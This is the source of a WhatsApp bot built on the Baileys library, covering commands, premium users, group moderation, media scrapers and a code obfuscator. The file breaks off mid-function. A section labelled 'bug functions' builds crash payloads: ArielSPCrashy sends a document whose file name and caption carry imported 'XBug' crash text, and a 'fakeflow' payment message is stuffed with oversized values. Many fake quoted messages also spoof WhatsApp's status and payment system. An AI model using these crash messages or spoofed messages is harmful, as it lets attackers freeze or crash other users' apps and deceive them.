require('./lib/listmenu')
const {
	downloadContentFromMessage,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    InteractiveMessage,
    getContentType
} = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const {translate} = require('@vitalets/google-translate-api')
const { download } = require('aptoide-scraper');
const scp2 = require('./lib/scraper2') 
const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./lib/scraper3.js')
const pkg = require('imgur')
const { ImgurClient } = pkg
const uploadImage = require('./lib/uploadImage')
const client = new ImgurClient({ clientId: "a0113354926015a" })
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./lib/uploader')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    GIFBufferToVideoBuffer,
    totalcase
} = require('./lib/myfunc')
const { aespisp_antispam } = require('./lib/antispam')
//prem owner function
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
//store
const { 
addResponList, 
delResponList, 
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./lib/list')

//cooldone
let lastUsed = 0;

//foto ftroli
const log0 = fs.readFileSync("./ArielFolder/image/asplogo.png")

//data
let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
//media
const VoiceNoteaespisp = JSON.parse(fs.readFileSync('./ArielFolder/database/aespivn.json'))
const Stickeraespisp = JSON.parse(fs.readFileSync('./ArielFolder/database/aespisticker.json'))
const Imageaespisp = JSON.parse(fs.readFileSync('./ArielFolder/database/aespiimage.json'))
const Videoaespisp = JSON.parse(fs.readFileSync('./ArielFolder/database/aespivideo.json'))
const Docaespisp = JSON.parse(fs.readFileSync('./ArielFolder/database/doc.json'))
const Zipaespisp = JSON.parse(fs.readFileSync('./ArielFolder/database/zip.json'))
const Apkaespisp = JSON.parse(fs.readFileSync('./ArielFolder/database/apk.json'))

//bug database
const { aespitext1 } = require('./src/data/function/XBug/aespitext1')
const { aespitext2 } = require('./src/data/function/XBug/aespitext2')
const { aespitext3 } = require('./src/data/function/XBug/aespitext3')
const { aespitext4 } = require('./src/data/function/XBug/aespitext4')
const { aespitext5 } = require('./src/data/function/XBug/aespitext5')
const { aespitext6 } = require('./src/data/function/XBug/aespitext6')
const wkwk = fs.readFileSync(`./src/data/function/XBug/x.mp3`)
const xsteek = fs.readFileSync(`./src/data/function/XBug/x.webp`)

//store database
const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))

const aespispverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var ArielSPtimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var ArielSPtimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var ArielSPtimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var ArielSPtimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var ArielSPtimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var ArielSPtimewisher = `Good Morning 🌄`
 } 
//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
//module
module.exports = ArielStore = async (ArielStore, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
       var body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);
        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix)
        //prefix2 and command2 particulary for auto download
        const prefix2 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
        const isCmd2 = body.startsWith(prefix2)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await ArielStore.decodeJid(ArielStore.user.id)
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const ArielSPmisc = (m.quoted || m)
        const quoted = (ArielSPmisc.mtype == 'buttonsMessage') ? ArielSPmisc[Object.keys(ArielSPmisc)[1]] : (ArielSPmisc.mtype == 'templateMessage') ? ArielSPmisc.hydratedTemplate[Object.keys(ArielSPmisc.hydratedTemplate)[1]] : (ArielSPmisc.mtype == 'product') ? ArielSPmisc[Object.keys(ArielSPmisc)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const ArielSPbody = body.startsWith(pric)
        const isCommand = ArielSPbody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await ArielStore.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        //anti media
        const isArielFolder = m.mtype
        //user status
        const isUser = aespispverifieduser.includes(sender)
        const aespispTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= aespispTheCreator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(ArielStore, m, premium)
        
        //theme sticker reply
        const aespispStickWait = () => {
        let aespispStikRep = fs.readFileSync('./ArielFolder/theme/sticker_reply/wait.webp')
        ArielStore.sendMessage(from, { sticker: aespispStikRep }, { quoted: ftroli })
        }
        const aespispStickAdmin = () => {
        let aespispStikRep = fs.readFileSync('./ArielFolder/theme/sticker_reply/admin.webp')
        ArielStore.sendMessage(from, { sticker: aespispStikRep }, { quoted: ftroli })
        }
        const aespispStickBotAdmin = () => {
        let aespispStikRep = fs.readFileSync('./ArielFolder/theme/sticker_reply/botadmin.webp')
        ArielStore.sendMessage(from, { sticker: aespispStikRep }, { quoted: ftroli })
        }
        const aespispStickOwner = () => {
        let aespispStikRep = fs.readFileSync('./ArielFolder/theme/sticker_reply/owner.webp')
        ArielStore.sendMessage(from, { sticker: aespispStikRep }, { quoted: ftroli })
        }
        const aespispStickGroup = () => {
        let aespispStikRep = fs.readFileSync('./ArielFolder/theme/sticker_reply/group.webp')
        ArielStore.sendMessage(from, { sticker: aespispStikRep }, { quoted: ftroli })
        }
        const aespispStickPrivate = () => {
        let aespispStikRep = fs.readFileSync('./ArielFolder/theme/sticker_reply/private.webp')
        ArielStore.sendMessage(from, { sticker: aespispStikRep }, { quoted: ftroli })
        }
 
 //bug functions
const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};
//bug functions
const subscribe_dgaespisp = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Ariel Tamvan`
}}
}
async function ArielSPCrashy(dgaespisp,chat) {
ArielStore.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgaespisp}.${aespitext1}` ,
caption: `${dgaespisp + aespitext1}`,
}, {quoted: subscribe_dgaespisp })
}
//end bug functions

        //premium
        async function replyprem(teks) {
    replygcaespisp(`This feature is for premium user, contact the owner to become premium user`)
}
        //script replier
        async function sendaespispBotIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await ArielStore.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        //reply
        async function replygcaespisp(teks) {
            if (typereply === 'v1') {
                m.reply(teks)
            } else if (typereply === 'v2') {
                ArielStore.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'v3') {
               ArielStore.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: ftroli })
            } else if (typereply === 'v4') {
                replygcaespisp2(teks)
            }
        }
        
        //fake reply with channel link embedded
async function replygcaespisp2(txt) {
const aespispnewrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363282476141407@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: ownername,
thumbnailUrl: 'https://i.ibb.co/Wppj16p/aespixyz.jpg',
sourceUrl: websitex
},
},
text: txt,
}
return ArielStore.sendMessage(from, aespispnewrep, {
quoted: ftroli,
})
}
            
        let fstatus = { 
            key: { 
               fromMe: false, 
               participant: `0@s.whatsapp.net`,  
               ...(m.chat ? {  remoteJid: "status@broadcast"  } : {}) 
            }, 
               message: {  
                  "imageMessage": { 
                     "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
                     "mimetype": "image/jpeg", 
                     "caption": botname,
                     "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
                     "fileLength": "28777",
                     "height": 1080,
                     "width": 1079,
                     "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                     "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                     "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                     "mediaKeyTimestamp": "1610993486",
                     "jpegThumbnail": await reSize(thumb, 100, 100),
                     "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                  }
               }
            }
            
            //Fake quoted 
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
        const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 121105,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./ArielFolder/theme/aespixyz.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const frpayment = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
            
            const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        
        //database
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? 1000 : 100
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('badword' in user)) user.badword = 0
                if (!('title' in user)) user.title = ''
                if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('nick' in user)) user.nick = ArielStore.getName(sender)
                if (!isPremium) user.premium = false
                if (!('totalLimit' in user)) user.totalLimit = 0
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[sender] = {
               serialNumber: randomBytes(16).toString('hex'),
               title: `${isPremium ? 'Premium' : 'User'}`,
               afkTime: -1,
               badword: 0,
               afkReason: '',
               nick: ArielStore.getName(sender),
               premium: `${isPremium ? 'true' : 'false'}`,
               limit: limitUser,
               totalLimit: 0
            }
            
               let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('badword' in chats)) chats.badword = false
                  if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antispam' in chats)) chats.antispam = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antivirtex' in chats)) chats.antivirtex = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                  if (!('antipromotion' in chats)) chats.antipromotion = false
               } else global.db.data.chats[from] = {
                  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antispam: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antipromotion: false,
                  antilinkgc: false
               }
            
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autodownload' in setting)) setting.autodownload = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
               if (!('watermark' in setting)) setting.watermark = { packname , author }
               if (!('about' in setting)) setting.about = { bot: { nick: ArielStore.getName(botNumber), alias: botname}, owner: { nick: ArielStore.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
            } else global.db.data.settings[botNumber] = {
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autodownload: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,
               watermark: {
                  packname: global.packname, 
                  author: global.ownername
               },
               about: {
                  bot: {
                     nick: ArielStore.getName(botNumber), 
                     alias: botname
                  },
                  owner: {
                     nick: ArielStore.getName(global.ownernumber + '@s.whatsapp.net'), 
                     alias: global.ownernumber
                  }
               }
            }
            
        } catch (err) {
            console.log(err)
        }
       
        //photo uploader
        async function uploadtoimgur(imagepath) {
  try {
    const response = await client.upload({
      image: fs.createReadStream(imagepath),
      type: 'stream',
    })

    let url = response.data.link
    console.log(url)
    return url
  } catch (error) {
    console.error('Error uploading image to Imgur:', error)
    throw error
  }
}        
        async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

//autoreact
const aespispreact = async () => {
  const emojis = ["🌷", "🤙", "😂", "🤣", "😭", "🫂", "💔", "😡"]; 
  for (const emoji of emojis) {
    await sleep(80);
    ArielStore.sendMessage(m.chat, { react: { text: emoji, key: m.key }});
  }
  await sleep(50);
  ArielStore.sendMessage(m.chat, { react: { text: randomemoji, key: m.key }});
}

//bug loading
async function loading () {
var aespisplod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await ArielStore.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < aespisplod.length; i++) {
await ArielStore.sendMessage(from, {text: aespisplod[i], edit: key })
}
} 

const aespispimun = (texto) => {
ArielStore.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return m.reply("Erro..")
})
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

//sticker meta function
async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const {
      default: {
            Image
                }
                  } = await import('node-webpmux')
                    const img = new Image()
                      const json = {
                          'sticker-pack-id': 'Natsxe',
                              'sticker-pack-name': packname,
                                  'sticker-pack-publisher': author,
                                      'emojis': categories,
                                          'is-avatar-sticker': 1,
                                              ...extra
                                                }
                                                  let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
                                                    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
                                                      let exif = Buffer.concat([exifAttr, jsonBuffer])
                                                        exif.writeUIntLE(jsonBuffer.length, 14, 4)
                                                          await img.load(buffer)
                                                            img.exif = exif
                                                              return await img.save(null)
                                                              }
function makeid(length) {
  let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
  return result;
  }

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
